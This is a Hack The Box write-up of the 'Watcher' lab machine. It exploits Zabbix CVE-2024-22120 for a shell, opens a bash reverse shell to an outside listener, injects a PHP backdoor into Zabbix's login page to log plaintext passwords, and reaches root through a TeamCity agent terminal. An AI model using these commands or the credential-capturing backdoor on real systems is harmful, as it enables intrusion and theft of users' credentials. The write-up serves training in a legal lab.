---
title: "HTB - Watcher"
date: 2026-06-07
tags: ["HackTheBox", "Linux", "Zabbix", "CVE-2024-22120", "TeamCity", "SQLi"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Watcher.png"
---
**Difficulty:** Medium | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before running any scans, the logo and name of this machine provide clear clues about the theme.

### The Logo

The logo features a colossal, moss-covered, dark bird (resembling a raven or crow) peering down through a decaying stone archway or ruins. A solitary figure stands below, gazing up at this giant creature.

**Key takeaways from the logo:**
- **The Giant Bird:** Ravens and crows are historically associated with keeping watch, intelligence, and acting as sentinels or observers.
- **The Archway:** Represents a gateway, bridge, or a passage to hidden internals.
- **The Figure:** A player or administrator looking up at a massive system that observes everything.

### The Name

"Watcher" aligns directly with:
- System monitoring, auditing, or logging software.
- In a Linux environment, this heavily suggests tools like Zabbix, Nagios, Prometheus, or Grafana which "watch" over the network.
- The path to root might involve manipulating or hijacking these monitoring/watching systems.

### The Instant Hypothesis

> *"Watcher points to an infrastructure monitoring system such as Zabbix or Nagios. The giant bird logo indicates monitoring and observation. The foothold likely involves exploiting a vulnerability in a monitoring platform (Zabbix), while the privilege escalation might involve abusing administrative capabilities, active agent controls, or internal automation services like TeamCity."*

This hypothesis holds true: we exploit Zabbix for a foothold, capture credentials from simulated user login, and leverage TeamCity agent controls for root.

<!--more-->

---

## Synopsis

Watcher is a medium difficulty Linux box running Zabbix, vulnerable to CVE-2024-22120 which allows unauthenticated RCE via blind SQL injection on the Zabbix server port. After gaining a shell as the zabbix user, the Zabbix login page is backdoored to capture credentials from a simulated user. The captured credentials are used to access an internal TeamCity instance via SSH port forwarding, and the TeamCity agent terminal (running as root) is abused to read the root flag.

---

## Enumeration

### Nmap

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp    open  http    Apache httpd 2.4.52
10050/tcp open  tcpwrapped
10051/tcp open  tcpwrapped
```

Port 80 redirects to `http://watcher.vl` so we add it to `/etc/hosts`. Ports 10050 and 10051 are the Zabbix agent and server ports respectively.

### Subdomain Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
```

```
zabbix  [Status: 200, Size: 3946]
```

Add `zabbix.watcher.vl` to `/etc/hosts` and browse to it. The footer reveals **Zabbix 7.0.0alpha1**. Guest login is enabled, and clicking "sign in as guest" gives dashboard access with minimal permissions.

---

## Foothold - CVE-2024-22120

### Vulnerability

CVE-2024-22120 is a time-based blind SQL injection in the Zabbix server audit log functionality. It requires a valid session ID (even guest level) and a host ID. The exploit connects directly to port 10051 (Zabbix server protocol) and extracts the admin session ID character by character from the sessions table using sleep-based timing.

### Step 1: Get the Host ID

Browse to Inventory > Hosts as guest. Click the Zabbix server entry and check the URL bar at the bottom:

```
zabbix.watcher.vl/hostinventories.php?hostid=10084
```

Host ID is **10084**.

### Step 2: Get the Guest Session ID

Login as guest via the API:

```bash
curl -s -X POST http://zabbix.watcher.vl/api_jsonrpc.php \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"guest","password":""},"id":1}'
```

```json
{"jsonrpc":"2.0","result":"82341ad87e77ca1ea965d00a3277b041","id":1}
```

Alternatively decode the `zbx_session` browser cookie to extract the sessionid field:

```bash
echo "eyJzZXNzaW9uaWQiOiI1NGMxZmFjMTgzOWQ0OWJjYjcxMTlhYmJjMjExMTU4NyIs..." | base64 -d
```

```json
{
  "sessionid": "54c1fac1839d49bcb7119abbc2111587",
  "serverCheckResult": true,
  "serverCheckTime": 1780853880,
  "sign": "de2c7a8263f29e85d87b2395dc0f121947ba715a3985c8bb05e4e8adc57273ce"
}
```

Guest SIDs expire quickly so chain the login and exploit immediately:

```bash
SID=$(curl -s -X POST http://zabbix.watcher.vl/api_jsonrpc.php \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"guest","password":""},"id":1}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")

echo "[*] SID: $SID"
```

### Step 3: Run the Exploit

The exploit must connect to port **10051** (not 80). It uses the Zabbix server binary protocol to inject SQL into the clientip field of a command request:

```bash
python3 cve.py --ip zabbix.watcher.vl --port 10051 --sid $SID --hostid 10084
```

```
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
[zabbix_cmd]>>: whoami
zabbix

[zabbix_cmd]>>:
```

### Step 4: Reverse Shell

Send a reverse shell from the zabbix_cmd prompt:

```bash
[zabbix_cmd]>>: bash -c "/bin/bash -i >& /dev/tcp/10.10.16.135/4444 0>&1" &
```

Catch it on the listener:

```bash
nc -lvnp 4444
```

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## User Flag

```bash
cat /var/lib/zabbix/user.txt
```

---

## Privilege Escalation - zabbix to Frank

### Backdooring the Zabbix Login Page

The zabbix user has full write access to `/usr/share/zabbix/`. The plan is to modify `index.php` to write credentials to a file every time any user logs in, then wait for the simulated Frank user to authenticate.

First identify the login handler and find the exact line:

```bash
cat /usr/share/zabbix/index.php | grep -n "login\|session" | head -20
```

```
34:  'sessionid' =>  [T_ZBX_STR, O_OPT, null, null, null],
57:  $autologin = hasRequest('enter') ? getRequest('autologin', 0) : getRequest('autologin', 1);
71:  if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
72:      CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
```

Line 72 is the injection point, right after a successful login sets the session. Inject the backdoor using Python:

```bash
python3 << 'EOF'
lines = open('/usr/share/zabbix/index.php').readlines()
backdoor = '''\t$file = fopen("/usr/share/zabbix/creds.txt", "a+");
\tfputs($file, "Username: " . getRequest("name", "") . " | Password: " . getRequest("password", "") . "\\n");
\tfclose($file);
'''
new_lines = []
for line in lines:
    new_lines.append(line)
    if "CSessionHelper::set('sessionid'" in line:
        new_lines.append(backdoor)
open('/usr/share/zabbix/index.php', 'w').writelines(new_lines)
print("done")
EOF
```

Verify the backdoor landed:

```bash
grep -n "creds.txt" /usr/share/zabbix/index.php
# 73:   $file = fopen("/usr/share/zabbix/creds.txt", "a+");
```

Wait for the simulated user to login (usually 1-2 minutes):

```bash
watch -n 2 'cat /usr/share/zabbix/creds.txt 2>/dev/null || echo waiting...'
```

```
Username: Frank | Password: R%)3S7^Hf4TBobb(gVVs
```

---

## Lateral Movement - Frank via TeamCity

### Discovering the Internal Service

```bash
ss -tulnp
```

Port **8111** is listening on `[::ffff:127.0.0.1]:8111` (localhost only, not detected by the external Nmap scan). This is Apache Tomcat running TeamCity.

### Setting Up SSH for Port Forwarding

Generate an SSH keypair from the zabbix home directory:

```bash
cd /var/lib/zabbix
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh-keygen
# Save to /var/lib/zabbix/.ssh/id_rsa, no passphrase
```

```bash
cd /var/lib/zabbix/.ssh
cat id_rsa.pub > authorized_keys
chmod 600 authorized_keys
cat id_rsa
# Copy this private key to attack box
```

Save the private key on your attack box as `rsa`, then port forward:

```bash
chmod 600 rsa
ssh -i rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
```

Verify it works:

```bash
curl -s http://127.0.0.1:8111 | head -5
# Authentication required
# To login manually go to "/login.html" page
```

### Logging into TeamCity

Browse to `http://127.0.0.1:8111/login.html` and login with:

```
Username: Frank
Password: R%)3S7^Hf4TBobb(gVVs
```

---

## Root - TeamCity Agent Terminal

From the TeamCity dashboard navigate to **Agents > Default Agent**.

The agent summary shows:
```
Hostname:  localhost
IP:        127.0.0.1
Port:      9090
OS:        Linux, version 6.8.0-1039-aws
```

Click **Open Term** (Agent Terminals). The terminal provides direct shell access as the user TeamCity runs as:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

TeamCity is running as root. Read the root flag:

```bash
cat /root/root.txt
```

---

## Attack Chain

```
Guest Zabbix login (no credentials needed)
             |
             v
CVE-2024-22120 - blind SQLi via port 10051
Host ID: 10084 | Guest SID from cookie/API
             |
             v
Admin sessionid extracted character by character
             |
             v
zabbix_cmd shell -> reverse shell as zabbix
             |
             v
Write access to /usr/share/zabbix/
Backdoor index.php to capture login credentials
             |
             v
Frank: R%)3S7^Hf4TBobb(gVVs captured from creds.txt
             |
             v
SSH keygen in /var/lib/zabbix/.ssh/
Port forward: ssh -i rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
             |
             v
TeamCity at http://127.0.0.1:8111
Login as Frank -> Agents -> Default Agent -> Open Term
             |
             v
uid=0(root) -> cat /root/root.txt
```

---

## Key Takeaways

- **CVE-2024-22120**: Guest sessions are enough to exploit. Disable guest login and keep Zabbix updated to a patched version.
- **Port 10051 vs 80**: The exploit uses the Zabbix binary protocol on port 10051, not HTTP. Running on port 80 fails with EOFError.
- **Zabbix file permissions**: The zabbix process user should not have write access to web application files. Use read-only mounts or strict file permissions to prevent backdooring.
- **Internal service discovery**: Always run `ss -tulnp` after getting a shell. Services like TeamCity are often not visible in external scans.
- **TeamCity Agent Terminals**: If TeamCity runs as root, the agent terminal feature gives instant root code execution to any user with agent access. Services should always run as dedicated low-privilege users.
- **Credential capture via backdoor**: Web app backdooring combined with simulated user activity is a reliable lateral movement technique. Monitor PHP files for unexpected modifications.

<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
